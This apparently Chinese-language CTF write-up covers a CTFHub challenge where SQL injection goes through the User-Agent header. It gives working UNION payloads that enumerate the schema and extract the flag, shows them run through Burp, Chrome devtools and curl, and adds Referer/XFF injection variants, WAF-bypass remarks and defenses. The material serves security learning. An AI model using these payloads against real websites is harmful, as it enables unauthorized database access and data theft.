---
layout: post
title: CTFHub - SQL UA 注入 Writeup
platform: ctfhub
date: 2026-10-22 19:01:00 +0800
categories: CTF
---

CTFHub - SQL UA 注入 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → UA 注入）
- 题型：Web
- 考点：**注入点在 User-Agent 请求头**、UNION 联合查询


```text
页面标题：CTFHub 技能学习 | UA注入
页面提示：输入点在User-Agent，试试吧        ← 直接告诉你在哪

★ 用 curl 访问首页时，回显的 SQL 就暴露了一切：

    select * from news where id=curl/8.21.0
                                └────┬────┘
                          我 curl 的 User-Agent 被原样拼进去了！

    → 说明后端代码是：
          $ua = $_SERVER['HTTP_USER_AGENT'];
          $sql = "select * from news where id=$ua";

★ 把 User-Agent 改成 1：

    UA: 1
    → select * from news where id=1
       ID: 1
       Data: ctfhub

★ 注入验证：

    UA: 0 union select 1,2
    → Data: 2                       ✅ UNION 可用，2 个字段

★ 完整利用（随机表名/字段名）：

    UA: 0 union select 1,database()
    → Data: sqli

    UA: 0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
    → Data: sqli:news:id,sqli:news:data,sqli:nnndniwjzb:mbcvagfqge
                    └────┬────┘ └────┬────┘  └──────┬──────┘ └──────┬───────┘
                 普通业务表          目标表（随机）        目标字段（随机）

    UA: 0 union select 1,group_concat(mbcvagfqge) from nnndniwjzb
    → Data: ctfhub{c540a47f6192f81dfce5e291}

    表里只有 1 行（count(*) → 1）

flag         : ctfhub{c540a47f6192f81dfce5e291}
```

二、题目分析

**① 为什么 User-Agent 会被拼进 SQL**

**真实场景**：网站要记录访客信息

```php
// 很多网站的"访问统计"功能会这么做：
$ua = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
$sql = "insert into visit_log(ua, ip, time) values('$ua', '$ip', now())";

// 或者"根据 UA 判断设备"：
$sql = "select * from news where id=$ua";
```

**★ 关键问题**：`$_SERVER['HTTP_USER_AGENT']` 是**用户完全可控**的

```
你可以把 User-Agent 设成任意字符串
浏览器插件、Burp、curl、开发者工具都能改
```

**② 页面回显 SQL 是最大的破绽**

```text
这题页面把拼好的 SQL 打出来了：

    select * from news where id=curl/8.21.0
                                └────┬────┘
                          这是我自己发的 UA，居然在 SQL 里！

★ 这一步几乎等于出题人把答案写脸上了 ——
  但即使不回显，只要试几个 UA 值看页面变不变，也能发现
```

**③ 注入点全家桶（这题在第 4 个位置）**

| 位置 | 后端取值 | 怎么改 |
|---|---|---|
| GET 参数 | `$_GET['id']` | 改 URL |
| POST 参数 | `$_POST['id']` | 改表单 |
| Cookie | `$_COOKIE['id']` | 改 Cookie 头 |
| **User-Agent** | `$_SERVER['HTTP_USER_AGENT']` | **改 UA 头** ← 本题 |
| Referer | `$_SERVER['HTTP_REFERER']` | 改 Referer 头 |
| X-Forwarded-For | `$_SERVER['HTTP_X_FORWARDED_FOR']` | 改 XFF 头 |

**排查顺序**：

```
URL 参数没反应 → POST → Cookie → UA → Referer → XFF
```

**④ 这题和整数型注入的关系**

| | 整数型注入 | UA 注入（本题） |
|---|---|---|
| 注入位置 | URL 参数 `?id=` | **User-Agent 头** |
| SQL 形式 | `where id=1` | `where id=<UA>`（一样）|
| payload | `0 union select ...` | `0 union select ...`（一样）|
| **区别** | — | **payload 放在 UA 里** |

**★ 除了"放在哪"，技术完全一样。**

三、解题步骤

**方法一：Burp Suite（最方便，推荐）**

**第 1 步：抓包**

```
① Burp → Proxy → Intercept is on
② 浏览器访问题目地址
③ Burp 拦到请求，看到：

    GET / HTTP/1.1
    Host: challenge-xxx:10800
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
    Accept: text/html,...
```

**第 2 步：改 User-Agent 为 `1`**

```
把 User-Agent 那一整行改成：

    User-Agent: 1

点 Forward
```

**浏览器里显示**：

```
select * from news where id=1
ID: 1
Data: ctfhub
```

**📝 这就确认了 UA 被拼进 SQL。**

**第 3 步：改 UA 试注入**

```
User-Agent: 0 union select 1,2
→ 页面显示 ID: 1  Data: 2        ← ★ 注入成功
```

**第 4 步：★ 用 Repeater 提高效率**

```
① 右键请求 → Send to Repeater（Ctrl+R）
② 切到 Repeater 标签
③ 以后每次只改 User-Agent 那行 → 点 Send → 右边立刻看响应
```

**★ 强烈建议用 Repeater** —— 省得每次都重新抓包。

**第 5 步：爆库名**

```
User-Agent: 0 union select 1,database()
→ Data: sqli
```

**第 6 步：一次爆出表名和字段名**

```
User-Agent: 0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
→ Data: sqli:news:id,sqli:news:data,sqli:nnndniwjzb:mbcvagfqge
```

**解读**：

```
sqli : news : id
sqli : news : data
sqli : nnndniwjzb : mbcvagfqge      ← ★ 随机表名 + 随机字段名
       └────┬────┘   └────┬────┘
        目标表          目标字段
```

**第 7 步：拿 flag**

```
User-Agent: 0 union select 1,group_concat(mbcvagfqge) from nnndniwjzb
→ Data: ctfhub{c540a47f6192f81dfce5e291}
```

**第 8 步：提交 flag → 通关**

---

**方法二：Chrome 开发者工具的"User agent 覆盖"**

**这个不用 Burp，直接在浏览器里改 UA**：

```
① F12 打开开发者工具
② 点右上角的 ⋮（三个点）→ 【更多工具】→ 【网络条件】
③ 找到 【用户代理】 那一栏
④ 取消勾选"使用浏览器默认值"
⑤ 在输入框里填 payload：
       0 union select 1,database()
⑥ 刷新页面（F5）
⑦ 页面变成：Data: sqli
```

**注意**：

```
★ 改了 UA 后，页面上的所有请求都会用这个 UA
★ 每次改完都要刷新页面
★ 有些 Chrome 版本里这个面板叫"网络限速"/"Network conditions"
```

---

**方法三：curl 命令行（最快）**

```bash
BASE="http://challenge-xxx:10800"

# 正常请求
curl -s -A "1" "$BASE/"

# 注入：库名
curl -s -A "0 union select 1,database()" "$BASE/"

# 注入：表名+字段名
curl -s -A "0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()" "$BASE/"

# 注入：拿 flag
curl -s -A "0 union select 1,group_concat(mbcvagfqge) from nnndniwjzb" "$BASE/"
```

**`-A` 参数就是设置 User-Agent**：

```bash
curl -A "你的payload" URL
# 等价于
curl -H "User-Agent: 你的payload" URL
```

**★ 用 curl 的好处**：

```
· UA 里可以随便放空格、引号、括号（不像 Cookie 有编码限制）
· 一行命令就出结果，适合批量尝试
· 不用来回抓包
```

---

四、延伸知识

**① User-Agent 注入的真实危害**

```text
UA 通常被记录到【访问日志表】里：

    insert into log(ua, ip, referer, url, time) values('$ua', ...)

这意味着：
    ① 攻击者可以用 UA 注入【写数据】（不只是读）
    ② 可以插入大量垃圾数据把表撑爆（磁盘/DOS）
    ③ 可以和 XSS 组合（有些后台管理页面会把 UA 显示出来）
    ④ 日志表往往权限宽松，容易成为跳板
```

**② 为什么很多 WAF 会漏掉 UA 注入**

```text
大部分 WAF 重点防护：
    · URL 参数
    · POST body
    · Cookie

对 HTTP 头（UA / Referer / XFF）的关注度较低
→ 实战中换个注入点往往能绕过 WAF

★ 这也是 CTF 单独设"UA 注入/Refer 注入"这几关的意义
```

**③ Referer 注入（同类，思路一样）**

```text
如果后端代码是：
    $ref = $_SERVER['HTTP_REFERER'];
    $sql = "select * from news where id=$ref";

那就改 Referer 头：

    Referer: 0 union select 1,database()

★ 在 Burp 里就是改 Referer 那一行
★ 在浏览器里，地址栏跳转时 Referer 自动设置 ——
  不好手工改，所以 Referer 注入基本都用 Burp
```

**④ X-Forwarded-For 注入**

```text
后端可能用 XFF 记录"真实 IP"：
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $sql = "insert into visit(ip) values('$ip')";

注入：
    X-Forwarded-For: 1' or 1=1 -- -
```

**⑤ 防护**

```text
· ★ 参数化查询（根本办法）—— 对任何来源的输入都一样
· 不要相信任何 HTTP 头：
    User-Agent / Referer / X-Forwarded-For / Accept-Language ...
· 对日志类字段做长度限制（如 UA 截断到 200 字符）
· 转义单引号（addslashes / mysqli_real_escape_string）
    （但参数化查询才是正道）
· 最小权限数据库账号
```

五、总结

- **本题核心：注入点从 URL/Cookie 换到了 `User-Agent` 请求头，payload 和 UNION 注入完全一样。**
- 三步定位：

```text
① 页面提示"输入点在User-Agent"
② 页面回显 SQL，里面赫然是 curl/8.21.0（我的 UA）
③ 把 UA 改成 1 → 页面显示 ID:1 Data:ctfhub（确认生效）
```

- 完整 payload（放在 User-Agent 里）：

```text
User-Agent: 0 union select 1,database()
User-Agent: 0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
User-Agent: 0 union select 1,group_concat(mbcvagfqge) from nnndniwjzb
```

- **三个必记要点**：

```text
① 注入点可以在任何"用户可控输入"里：
     URL / POST / Cookie / User-Agent / Referer / X-Forwarded-For
② UA 注入的 payload 不用特殊编码（不像 Cookie 有空格限制）
③ 实战意义：WAF 常常只防 URL 和 body，换个头就能绕过
``
**手工复现要点**：

```text
· 最快的办法：Burp 抓包 → Send to Repeater → 每次只改 User-Agent 那一行
· 或者用 curl -A "payload" URL 一行搞定
· 不用装任何工具，浏览器 + Burp（或 curl）足够
```
